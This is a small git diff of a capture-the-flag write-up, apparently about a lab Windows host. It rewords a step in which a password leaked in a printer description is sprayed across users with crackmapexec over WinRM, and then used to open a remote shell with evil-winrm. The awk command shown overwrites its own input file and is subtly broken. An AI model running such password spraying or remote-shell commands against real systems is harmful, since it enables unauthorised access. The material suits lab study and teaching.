@@ -120,8 +120,8 @@ Enumprinters
 description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
 ```
 
-I tried this password for all of the users I got from querydispinfo (I created a new list of users and used this command: </br>
-```cat users | awk -F\[ '{print $2}' | awk -F\] '{print $1}' > users```) </br>
+I tried this password for all of the users I got from querydispinfo , I created a new list of users and used this command: </br>
+```cat users | awk -F\[ '{print $2}' | awk -F\] '{print $1}' > users``` </br>
 ```crackmapexec winrm 10.10.10.193 -u users -p '$fab@s3Rv1ce$1' --continue-on-success``` </br>
 And I found the suitable user: svc-print </br>
 ```evil-winrm -i 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1'``` </br>
